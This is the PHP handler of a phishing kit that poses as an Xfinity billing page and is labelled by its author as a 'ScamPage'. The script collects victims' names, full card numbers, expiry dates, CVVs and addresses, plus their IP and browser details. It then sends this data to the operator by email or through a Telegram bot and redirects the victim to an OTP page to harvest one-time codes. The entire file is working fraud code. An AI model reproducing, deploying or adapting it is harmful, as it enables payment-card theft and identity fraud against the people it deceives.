<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['cardNumber'] ) ) {
		
		$_SESSION['firstName'] 	  = $_POST['firstName'];
		$_SESSION['lastName'] 	  = $_POST['lastName'];
		$_SESSION['cardNumber'] 	  = $_POST['cardNumber'];
		$_SESSION['expirationMonth'] 	  = $_POST['expirationMonth'];
		$_SESSION['expirationYear'] 	  = $_POST['expirationYear'];
		$_SESSION['cvv'] 	  = $_POST['cvv'];
		$_SESSION['line1'] 	  = $_POST['line1'];
		$_SESSION['line2'] 	  = $_POST['line2'];
		$_SESSION['city'] 	  = $_POST['city'];
		$_SESSION['state'] 	  = $_POST['state'];
		$_SESSION['zip'] 	  = $_POST['zip'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 Xfinity Billing+CC ⚫️🌀 ]★　————-««
[FirstName] 		: {$_SESSION['firstName']}
[LastName]		: {$_SESSION['lastName']}
[Card Number] 		: {$_SESSION['cardNumber']}
[EXP]		: {$_SESSION['expirationMonth']}/{$_SESSION['expirationYear']}
[CVV] 		: {$_SESSION['cvv']}
[Address line 1]		: {$_SESSION['line1']}
[Address line 2] 		: {$_SESSION['line2']}
[City]		: {$_SESSION['city']}
[State]		: {$_SESSION['state']}
[Zip] 		: {$_SESSION['zip']}

»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 Xfinity ScamPage By GreyHatPakistan ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;
		if ($sendtoemail=="yes"){
		$subject = "🏛️ Xfinity Billing+CC By GreyHatPakistan🏛️  From $ip";
        $headers = "From: 🍁Greyhatpakistan🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}

	if ($sendtotelegram=="yes"){
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}


        header("Location: ../otp.php");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}


?>